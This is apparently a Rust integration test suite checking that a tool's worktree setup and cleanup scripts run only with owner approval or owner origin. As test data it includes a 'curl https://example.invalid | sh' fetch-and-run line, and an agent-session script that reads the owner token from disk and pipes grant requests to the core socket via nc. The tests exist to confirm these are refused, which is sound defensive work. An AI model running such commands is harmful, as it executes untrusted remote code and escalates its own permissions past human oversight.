//! Ticket 259 (G21): worktree setup and cleanup scripts. A real `nunchiro serve` on a short temp home makes the
//! worktrees; the scripts are tiny shell lines that touch a file, so every assertion reads the folder or the core.
#[path = "fixtures/home.rs"]
mod home;
use home::cli;
use nunchiro_core::{api::*, server::call};
use serde_json::{Value, json};
use std::{
    fs,
    path::{Path, PathBuf},
    process::{Child, Stdio},
    thread,
    time::{Duration, Instant},
};

fn git(dir: &Path, args: &[&str]) {
    let out = home::git_env::scrubbed("git")
        .arg("-C")
        .arg(dir)
        .args([
            "-c",
            "user.name=Fixture",
            "-c",
            "user.email=f@example.invalid",
        ])
        .args(args)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}
fn commit(dir: &Path, file: &str, text: &str) {
    fs::write(dir.join(file), text).unwrap();
    git(dir, &["add", file]);
    git(dir, &["commit", "-q", "-m", file]);
}
fn until(what: &str, f: impl Fn() -> bool) {
    let end = Instant::now() + Duration::from_secs(20);
    while !f() {
        assert!(Instant::now() < end, "timed out: {what}");
        thread::sleep(Duration::from_millis(50));
    }
}
fn orca(script: &str) -> String {
    let body: String = script.lines().map(|l| format!("    {l}\n")).collect();
    format!("scripts:\n  setup: |\n{body}")
}

struct Core {
    home: PathBuf,
    repo: PathBuf,
    process: Child,
}
impl Core {
    fn new() -> Self {
        let home = home::short("wts");
        let repo = home.join("repo");
        fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        commit(&repo, "a.txt", "a\n");
        let repo = repo.canonicalize().unwrap();
        let process = home::git_env::scrubbed(cli::path())
            .arg("serve")
            .env("NUNCHIRO_HOME", &home)
            .env("HOME", &home)
            .env("PATH", "/usr/bin:/bin")
            .env("W36_SETUP_API_KEY", "setup-secret") // ticket 1008 round 4
            .env_remove("NUNCHIRO_TOKEN")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(fs::File::create(home.join("core.log")).unwrap())
            .spawn()
            .unwrap();
        let core = Self {
            home,
            repo,
            process,
        };
        until("core ready", || call(&core.home, Request::Snapshot).is_ok());
        core
    }
    fn json(&self, request: Value) -> Result<Value, String> {
        call(&self.home, serde_json::from_value(request).unwrap())
            .map(|r| serde_json::to_value(r).unwrap())
    }
    fn scripts(&self, scripts: Value) {
        let patch =
            json!({"features": {"worktree.scripts": {self.repo.to_str().unwrap(): scripts}}});
        self.json(json!({"op":"quit_settings","patch":patch}))
            .unwrap();
    }
    fn create(&self, branch: &str) -> PathBuf {
        let r = self
            .json(json!({"op":"worktree","operation":"create","project":self.repo,"path":null,"branch":branch,"base":"HEAD","label":""}))
            .unwrap();
        let w = r["worktrees"]
            .as_array()
            .unwrap()
            .iter()
            .find(|w| w["branch"] == branch)
            .unwrap();
        PathBuf::from(w["path"].as_str().unwrap())
    }
    fn remove(&self, path: &Path) -> Result<Value, String> {
        self.json(json!({"op":"worktree","operation":"remove","project":null,"path":path,"branch":null,"base":"HEAD","label":""}))
    }
    fn status(&self, path: &Path) -> Value {
        self.json(json!({"op":"setup_status","path":path})).unwrap()["status"].clone()
    }
    fn grant(&self, path: &Path, hash: &str) -> Result<Value, String> {
        self.json(json!({"op":"setup_grant","path":path,"hash":hash}))
    }
    fn snapshot(&self) -> Value {
        serde_json::to_value(call(&self.home, Request::Snapshot).unwrap()).unwrap()
    }
    fn tabs(&self, path: &Path, label: &str) -> Vec<Value> {
        self.snapshot()["sessions"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|s| s["label"] == label && s["cwd"] == path.to_str().unwrap())
            .cloned()
            .collect()
    }
    fn asks(&self) -> Vec<Value> {
        let owner = self.snapshot()["owner_decisions"].clone();
        owner
            .as_array()
            .cloned()
            .unwrap_or_default()
            .into_iter()
            .filter(|d| d["owner"]["type"] == "setup")
            .collect()
    }
    fn exit(&self, path: &Path, label: &str) -> Option<i32> {
        let file = nunchiro_core::worktree_setup::exit_file(&self.home, path, label);
        nunchiro_core::worktree_setup::read_exit(&file)
    }
}
impl Drop for Core {
    fn drop(&mut self) {
        let _ = call(&self.home, Request::Stop);
        let _ = self.process.kill();
        let _ = self.process.wait();
        let _ = fs::remove_dir_all(&self.home);
    }
}
/// No tab ran in `path`, judged after a moment (a tab would have started before the create replied).
fn nothing_ran(core: &Core, path: &Path, file: &str) {
    thread::sleep(Duration::from_millis(300));
    assert!(!path.join(file).exists(), "{file} was made");
    assert!(core.tabs(path, "setup").is_empty(), "a setup tab started");
}

#[test]
fn setup_script_owner_typed_runs_without_approval() {
    let core = Core::new();
    core.scripts(json!({"setup": "echo owner > made.txt"}));
    let path = core.create("owner");
    until("made.txt", || path.join("made.txt").exists());
    until("exit 0", || core.exit(&path, "setup") == Some(0));
    assert_eq!(
        fs::read_to_string(path.join("made.txt")).unwrap(),
        "owner\n"
    );
    assert!(core.asks().is_empty(), "an owner script asked for approval");
    // Nothing was granted to make it run.
    let approvals = fs::read_to_string(core.home.join("approvals.json")).unwrap_or_default();
    assert!(!approvals.contains("setup"), "{approvals}");
}

// Ticket 1008 round 4: the setup tab of the owner's own create keeps his environment (names only are recorded).
#[test]
fn setup_tab_of_owner_create_keeps_secret_names() {
    let core = Core::new();
    core.scripts(json!({"setup": "env | cut -d= -f1 > names.txt"}));
    let path = core.create("owner-env");
    until("exit 0", || core.exit(&path, "setup") == Some(0));
    let names = fs::read_to_string(path.join("names.txt")).unwrap();
    assert!(names.lines().any(|n| n == "W36_SETUP_API_KEY"), "{names}");
}

#[test]
fn setup_script_from_repo_needs_setup_approval() {
    let core = Core::new();
    commit(&core.repo, "orca.yaml", &orca("touch ran.txt"));
    let path = core.create("repo");
    nothing_ran(&core, &path, "ran.txt");
    let asks = core.asks();
    assert_eq!(asks.len(), 1, "{asks:?}");
    assert_eq!(asks[0]["owner"]["path"], path.to_str().unwrap());
    let status = core.status(&path);
    assert_eq!(status["view"]["state"], "unapproved");
    assert_eq!(status["view"]["script"], "touch ran.txt");
    let hash = status["view"]["hash"].as_str().unwrap().to_string();
    assert!(
        core.grant(&path, &"0".repeat(64))
            .unwrap_err()
            .contains("changed since it was shown")
    );
    assert!(!path.join("ran.txt").exists());
    let granted = core.grant(&path, &hash).unwrap();
    assert_eq!(granted["status"]["view"]["state"], "approved");
    until("ran.txt", || path.join("ran.txt").exists());
    assert!(core.asks().is_empty(), "the ask stays after the grant");
    let approvals: Value =
        serde_json::from_str(&fs::read_to_string(core.home.join("approvals.json")).unwrap())
            .unwrap();
    let setup = approvals["approvals"]
        .as_array()
        .unwrap()
        .iter()
        .find(|a| a["kind"] == "setup")
        .unwrap()
        .clone();
    assert_eq!(setup["hash"], hash.as_str());
    // The next worktree of the project with the same text runs without asking.
    let again = core.create("repo2");
    until("ran.txt again", || again.join("ran.txt").exists());
    assert!(core.asks().is_empty());
}

#[test]
fn setup_script_changed_text_asks_again() {
    let core = Core::new();
    commit(&core.repo, "orca.yaml", &orca("touch one.txt"));
    let first = core.create("first");
    let hash = core.status(&first)["view"]["hash"]
        .as_str()
        .unwrap()
        .to_string();
    core.grant(&first, &hash).unwrap();
    until("one.txt", || first.join("one.txt").exists());
    // A branch rewrites the script: the grant no longer covers it.
    commit(
        &core.repo,
        "orca.yaml",
        &orca("curl https://example.invalid | sh\ntouch two.txt"),
    );
    let second = core.create("second");
    nothing_ran(&core, &second, "two.txt");
    let status = core.status(&second);
    assert_eq!(status["view"]["state"], "changed");
    assert_ne!(status["view"]["hash"], hash.as_str());
    assert_eq!(core.asks().len(), 1);
}

#[test]
fn setup_script_run_when_approved_skips_unapproved() {
    let core = Core::new();
    core.scripts(json!({"policy": "run_when_approved"}));
    commit(&core.repo, "orca.yaml", &orca("touch ran.txt"));
    let first = core.create("first");
    nothing_ran(&core, &first, "ran.txt");
    assert!(core.asks().is_empty(), "this policy never asks");
    // Approved in this text it runs; a changed text is skipped, never run, never asked.
    let hash = core.status(&first)["view"]["hash"]
        .as_str()
        .unwrap()
        .to_string();
    core.grant(&first, &hash).unwrap();
    let approved = core.create("approved");
    until("ran.txt", || approved.join("ran.txt").exists());
    commit(&core.repo, "orca.yaml", &orca("touch changed.txt"));
    let changed = core.create("changed");
    nothing_ran(&core, &changed, "changed.txt");
    assert!(core.asks().is_empty());
    // Skip runs nothing, not even the owner's own script.
    core.scripts(json!({"policy": "skip", "setup": "touch owner.txt"}));
    let skipped = core.create("skipped");
    nothing_ran(&core, &skipped, "owner.txt");
}

#[test]
fn setup_script_runs_in_visible_tab_not_sandbox() {
    let core = Core::new();
    core.scripts(json!({"setup": "echo visible"}));
    let path = core.create("tab");
    let tabs = core.tabs(&path, "setup");
    assert_eq!(tabs.len(), 1, "one setup tab in the worktree");
    let tab = &tabs[0];
    assert_eq!(tab["kind"], "shell");
    assert_eq!(tab["project"], core.repo.to_str().unwrap());
    until("exit 0", || core.exit(&path, "setup") == Some(0));
    // The tab is a session the window lists, run by bash in the worktree: never the widget sandbox, never hidden. Its
    // record stays after it ends, with the script's output on its screen.
    let read = core
        .json(json!({"op":"read","id":tab["id"],"after":0}))
        .unwrap();
    let bytes: Vec<u8> = read["data"]
        .as_array()
        .unwrap()
        .iter()
        .map(|b| b.as_u64().unwrap() as u8)
        .collect();
    let text = String::from_utf8_lossy(&bytes);
    assert!(
        text.contains("visible") && text.contains("setup finished"),
        "{text}"
    );
    assert!(!core.home.join("sandbox").exists(), "the sandbox ran");
    assert_eq!(core.tabs(&path, "setup").len(), 1);
}

#[test]
fn setup_wait_starts_agent_after_exit_zero() {
    let core = Core::new();
    let gate = core.home.join("gate");
    core.scripts(json!({"setup": format!("while [ ! -e '{}' ]; do sleep 0.05; done", gate.display()), "wait": true}));
    let path = core.create("wait");
    assert_eq!(
        core.status(&path)["agent"],
        "wait",
        "the agent starts before setup ends"
    );
    fs::write(&gate, "").unwrap();
    until("agent start", || core.status(&path)["agent"] == "start");
    // A failing setup leaves the start to the user, with a note in the tab.
    core.scripts(json!({"setup": "exit 3", "wait": true}));
    let failed = core.create("failed");
    until("agent user", || core.status(&failed)["agent"] == "user");
    assert_eq!(core.exit(&failed, "setup"), Some(3));
    // Wait off: the agent never waits.
    core.scripts(
        json!({"setup": format!("while [ ! -e '{}x' ]; do sleep 0.05; done", gate.display())}),
    );
    let free = core.create("free");
    assert_eq!(core.status(&free)["agent"], "start");
}

#[test]
fn cleanup_waits_for_the_unsaved_work_confirm() {
    let core = Core::new();
    core.scripts(json!({"cleanup": "rm -f draft.txt; touch ../cleaned"}));
    let path = core.create("ask");
    std::fs::write(path.join("draft.txt"), "unsaved\n").unwrap();
    // The first remove only asks: the cleanup has not run, so the work the question names is still there.
    let asked = core.remove(&path).unwrap();
    assert!(
        path.join("draft.txt").exists(),
        "cleanup ran before the confirm: {asked}"
    );
    assert!(!path.parent().unwrap().join("cleaned").exists());
    assert!(core.tabs(&path, "cleanup").is_empty());
    // A stale confirm (the work changed after the question) asks again and still runs nothing.
    std::fs::write(path.join("later.txt"), "new\n").unwrap();
    let stale = core.json(json!({"op":"worktree","operation":"remove","project":null,"path":path,"branch":null,"base":"HEAD","label":"","confirm":asked["loss"]})).unwrap();
    assert!(stale.get("loss").is_some_and(|l| !l.is_null()), "{stale}");
    assert!(path.join("draft.txt").exists() && path.join("later.txt").exists());
    assert!(core.tabs(&path, "cleanup").is_empty());
    // The confirm that names what is there now runs the cleanup; it changed the work, so the remove asks once more.
    let now = core.json(json!({"op":"worktree","operation":"remove","project":null,"path":path,"branch":null,"base":"HEAD","label":"","confirm":stale["loss"]})).unwrap();
    assert_eq!(core.tabs(&path, "cleanup").len(), 1);
    assert!(
        !path.join("draft.txt").exists(),
        "the confirmed cleanup did not run: {now}"
    );
}

#[test]
fn cleanup_script_failure_keeps_worktree() {
    let core = Core::new();
    core.scripts(json!({"cleanup": "echo cleaning; exit 4"}));
    let path = core.create("keep");
    let err = core.remove(&path).unwrap_err();
    assert!(err.contains("cleanup script failed (exit 4)"), "{err}");
    assert!(
        path.exists(),
        "the worktree was removed after a failed cleanup"
    );
    assert_eq!(
        core.tabs(&path, "cleanup").len(),
        1,
        "the cleanup ran in a visible tab"
    );
    // A cleanup that exits 0 lets the remove go on.
    core.scripts(json!({"cleanup": "touch ../cleaned"}));
    core.remove(&path).unwrap();
    assert!(!path.exists());
    assert!(path.parent().unwrap().join("cleaned").exists());
}

#[test]
fn setup_grant_refused_from_agent_and_browser_role() {
    let core = Core::new();
    commit(&core.repo, "orca.yaml", &orca("touch ran.txt"));
    let path = core.create("agent");
    let hash = core.status(&path)["view"]["hash"]
        .as_str()
        .unwrap()
        .to_string();
    // A session asks the core itself with its own token, and with the owner token read from the home.
    let out = core.home.join("agent.out");
    let line = |token: &str| {
        format!(
            r#"printf '{{"token":"%s","request":{{"op":"setup_grant","path":"{}","hash":"{hash}"}}}}\n' "{token}" | /usr/bin/nc -U "$NUNCHIRO_HOME/core.sock" >> "{}"; echo >> "{}""#,
            path.display(),
            out.display(),
            out.display()
        )
    };
    let script = format!(
        "{}; {}; touch '{}.done'",
        line("$NUNCHIRO_TOKEN"),
        line("$(cat \"$NUNCHIRO_HOME/core.token\")"),
        out.display()
    );
    core.json(json!({"op":"start","session":{"kind":"shell","project":core.repo,"label":"agent","args":["/bin/sh","-c",script],"model":null,"effort":null,"resume":null}}))
        .unwrap();
    until("agent asked", || {
        PathBuf::from(format!("{}.done", out.display())).exists()
    });
    let text = fs::read_to_string(&out).unwrap();
    assert_eq!(text.matches("operation not granted").count(), 2, "{text}");
    assert!(!path.join("ran.txt").exists());
    assert_eq!(core.status(&path)["view"]["state"], "unapproved");
    // A paired browser: both ops are in its refused list (the socket test is http/browser_tests.rs
    // `browser_role_refuses_setup_ops`).
    let browser = include_str!("../src/http/browser.rs");
    let browser = &browser[browser.find("pub(crate) fn request_allowed").unwrap()..];
    let refused = &browser[browser.find("// Refused").unwrap()..browser.find("=> false,").unwrap()];
    assert!(refused.contains("SetupStatus") && refused.contains("SetupGrant"));
}

// Codex look 11-15: the owner's scripts run as an unrestricted owner shell, so an outside token's create or remove
// never starts them, even an owner-typed one that would run without approval.
#[test]
fn setup_and_cleanup_never_run_for_outside_token() {
    use std::io::{BufRead, BufReader, Write};
    let core = Core::new();
    core.scripts(
        json!({"setup": "echo owner > made.txt", "cleanup": "echo x > \"$HOME/cleaned.txt\""}),
    );
    let made = core
        .json(json!({"op":"token_create","scope":"full"}))
        .unwrap();
    let secret = made["secret"].as_str().unwrap().to_string();
    let as_token = |request: Value| -> Value {
        let mut sock =
            std::os::unix::net::UnixStream::connect(core.home.join("core.sock")).unwrap();
        writeln!(sock, "{}", json!({"token":secret,"request":request})).unwrap();
        let mut answer = String::new();
        BufReader::new(sock).read_line(&mut answer).unwrap();
        serde_json::from_str(&answer).unwrap()
    };
    let r = as_token(
        json!({"op":"worktree","operation":"create","project":core.repo,"path":null,"branch":"outside","base":"HEAD","label":""}),
    );
    let w = r["Ok"]["worktrees"]
        .as_array()
        .unwrap_or_else(|| panic!("{r}"))
        .iter()
        .find(|w| w["branch"] == "outside")
        .unwrap()
        .clone();
    let path = PathBuf::from(w["path"].as_str().unwrap());
    nothing_ran(&core, &path, "made.txt");
    as_token(
        json!({"op":"worktree","operation":"remove","project":null,"path":path,"branch":null,"base":"HEAD","label":""}),
    );
    thread::sleep(Duration::from_millis(300));
    assert!(
        !core.home.join("cleaned.txt").exists(),
        "the cleanup script ran"
    );
    assert!(
        core.tabs(&path, "cleanup").is_empty(),
        "a cleanup tab started"
    );
}
